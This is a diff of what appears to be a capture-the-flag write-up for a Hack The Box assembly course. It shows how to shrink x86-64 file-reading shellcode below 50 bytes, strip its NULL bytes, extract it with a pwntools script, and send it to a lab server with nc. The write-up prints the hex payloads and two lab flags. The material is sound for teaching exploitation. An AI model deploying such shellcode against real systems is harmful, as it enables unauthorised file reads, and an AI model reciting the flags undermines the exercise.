@@ -5,7 +5,10 @@ categories: [Writeups]
 tags: [assembly, binary, shellcoding]
 ---
 <style>
-b {font-size:87.5%;color: #0398fc;word-wrap:break-word}
+b {color: #0398fc;word-wrap:break-word;}
+r {color: #eb6666;word-wrap:break-word;}
+g {color: #83a35c;word-wrap:break-word;}
+purple {color: #a49cda;word-wrap:break-word;}
 </style>
 
 # Intro to Assembly language - Skills Assessment
@@ -145,7 +148,6 @@ exit:                               ; Exit procedure
     xor dil, dil
     syscall
 ```
-
 Assemble the code, do dynamic linking with <b>libc</b> and execute it using :   
 `nasm -f elf64 flag.s &&  ld flag.o -o flag -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2 && ./flag`
 
@@ -171,5 +173,155 @@ HTB{4553mbly_d3bugg1ng_m4573r}$
 ```
 {: .nolineno }
 ## Task 2
-### Context
 
+For the second task, in a binary exploitation exercise, we get to the point where we have to un our shellcode. A buffer space of 50 bytes is available. The exercice consist of optimizing the given assembly code to make it <b>shellcode-ready</b> and <b>under 50 bytes</b>.
+
+Before starting, a quick reminder about shellcoding requirements : 
+
+1. Does not contain variables
+2. Does not refer to direct memory addresses
+3. Does not contain any NULL bytes `00`
+
+The provided assembly code :
+
+```nasm
+global _start
+
+section .text
+_start:
+    ; push './flg.txt\x00'
+    push 0              ; push NULL string terminator
+    mov rdi, '/flg.txt' ; rest of file name
+    push rdi            ; push to stack 
+    
+    ; open('rsp', 'O_RDONLY')
+    mov rax, 2          ; open syscall number
+    mov rdi, rsp        ; move pointer to filename
+    mov rsi, 0          ; set O_RDONLY flag
+    syscall
+
+    ; read file
+    lea rsi, [rdi]      ; pointer to opened file
+    mov rdi, rax        ; set fd to rax from open syscall
+    mov rax, 0          ; read syscall number
+    mov rdx, 24         ; size to read
+    syscall
+
+    ; write output
+    mov rax, 1          ; write syscall
+    mov rdi, 1          ; set fd to stdout
+    mov rdx, 24         ; size to read
+    syscall
+
+    ; exit
+    mov rax, 60
+    mov rdi, 0
+    syscall
+```
+
+Using this python code, we can generate our shellcode from the binary : 
+
+```python
+#!/usr/bin/python3
+
+import sys
+from pwn import *
+
+context(os="linux", arch="amd64", log_level="error")
+
+file = ELF(sys.argv[1])
+shellcode = file.section(".text")
+print(shellcode.hex())
+
+print("%d bytes - Found NULL byte" % len(shellcode)) if [i for i in shellcode if i == 0] else print("%d bytes - No NULL bytes" % len(shellcode))
+```
+{: .nolineno }
+
+This is the current result : 
+```shell
+python shellcoder.py flag
+6a0048bf2f666c672e74787457b8020000004889e7be000000000f05488d374889c7b800000000ba180000000f05b801000000bf01000000ba180000000f05b83c000000bf000000000f05
+75 bytes - Found NULL byte
+```
+{: .nolineno }
+
+Using pwn disasm we can see the instructions from the shellcode : 
+<pre><code>
+pwn disasm '6a0048bf2f666c672e74787457b8020000004889e7be000000000f05488d374889c7b800000000ba180000000f05b801000000bf01000000ba180000000f05b83c000000bf000000000f05' -c 'amd64'
+   0:    6a <r>00</r>                    <g>push</g> <purple>0x0</purple>
+   2:    48 bf 2f 66 6c 67 2e 74 78 74    <g>movabs</g> <r>rdi</r>,  <purple>0x7478742e676c662f</purple>
+   c:    57                       <g>push</g> <r>rdi</r>
+   d:    b8 02 <r>00 00 00</r>           <g>mov</g> <r>eax</r>,  <purple>0x2</purple>
+  12:    48 89 e7                 <g>mov</g> <r>rdi</r>,  <r>rsp</r>
+  15:    be <r>00 00 00 00</r>           <g>mov</g> <r>esi</r>,  <purple>0x0</purple>
+  1a:    0f 05                    <g>syscall</g>
+  1c:    48 8d 37                 <g>lea</g> <r>rsi</r>,  <r>[rdi]</r>
+  1f:    48 89 c7                 <g>mov</g> <r>rdi</r>,  <r>rax</r>
+  22:    b8 <r>00 00 00 00</r>           <g>mov</g> <r>eax</r>,  <purple>0x0</purple>
+  27:    ba 18 <r>00 00 00</r>           <g>mov</g> <r>edx</r>,  <purple>0x18</purple>
+  2c:    0f 05                    <g>syscall</g>
+  2e:    b8 01 <r>00 00 00</r>           <g>mov</g> <r>eax</r>,  <purple>0x1</purple>
+  33:    bf 01 <r>00 00 00</r>           <g>mov</g> <r>edi</r>,  <purple>0x1</purple>
+  38:    ba 18 <r>00 00 00</r>           <g>mov</g> <r>edx</r>,  <purple>0x18</purple>
+  3d:    0f 05                    <g>syscall</g>
+  3f:    b8 3c <r>00 00 00</r>           <g>mov</g> <r>eax</r>,  <purple>0x3c</purple>
+  44:    bf 00 <r>00 00 00</r>           <g>mov</g> <r>edi</r>,  <purple>0x0</purple>
+  49:    0f 05                    <g>syscall</g>
+</code></pre>
+
+As expected, we're exceeding 50 bytes and the shellcode contains NULL bytes (each <r>00</r> represents a null byte that needs to be removed).
+
+Here's the list of changes made to respect the requirements:
+- Line 1: replace `push 0` by `xor rsi, rsi` followed by `push rsi`. This will still push 0 to the stack and will replace `mov rsi, 0` from line 13.
+- Line 11: `mov al, 2` to use the 1-byte register instead of the 8-byte <b>rax</b>.
+- Line 18: replace `mov rdi, rax` by `mov edi, eax' to use 4-byte size registers.
+- Line 19: replace `mov rax, 0` by `xor al, al` to set the Syscall number to 0.
+- Line 21: replace `mov rdx, 24` by `mov dl, 24` to use a 2-byte register, per needed.
+- Line 24-25: replace `mov rax, 1` and `mov rdi, 1` by `mov al, 1` and `mov dil, 1` to use 1-byte registers.
+- Line 26: remove `mov rdx, 24` since the value is alredy set previously.
+
+This is the final code:
+```nasm
+global _start
+
+section .text
+_start:
+    ; push './flg.txt\x00'
+    xor rsi, rsi            ; set rsi to 0
+    push rsi                ; push NULL string terminator
+    mov rdi, '/flg.txt'     ; set the file name
+    push rdi                ; push file name to stack
+    
+    ; open('rsp', 'O_RDONLY')
+    ; rsi '0_RDONLY' is already set to 0 from previous instructions
+    mov al, 2               ; open syscall number
+    mov rdi, rsp            ; move pointer to filename
+    syscall                 
+
+    ; read file
+    lea rsi, [rdi]          ; pointer to opened file
+    mov edi, eax            ; set fd to rax from open syscall
+    xor al, al              ; read syscall number
+    mov dl, 24              ; size to read
+    syscall
+
+    ; write output
+    mov al, 1               ; write syscall
+    mov dil, 1              ; set fd to stdout
+    syscall
+```
+{: .nolineno }
+
+If I generate the shellcode and check for null bytes this is the result :
+```shell
+python shellcoder.py flag
+4831f65648bf2f666c672e74787457b0024889e70f05488d3789c730c0b2180f05b00140b7010f05
+40 bytes - No NULL bytes
+```
+
+Finally, if I send the shellcode to the server the flag is returned :
+```shell
+$ nc 94.237.63.201 58840
+4831f65648bf2f666c672e74787457b0024889e70f05488d3789c730c0b2180f05b00140b7010f05
+HTB{5h3llc0d1ng_g3n1u5}
+```
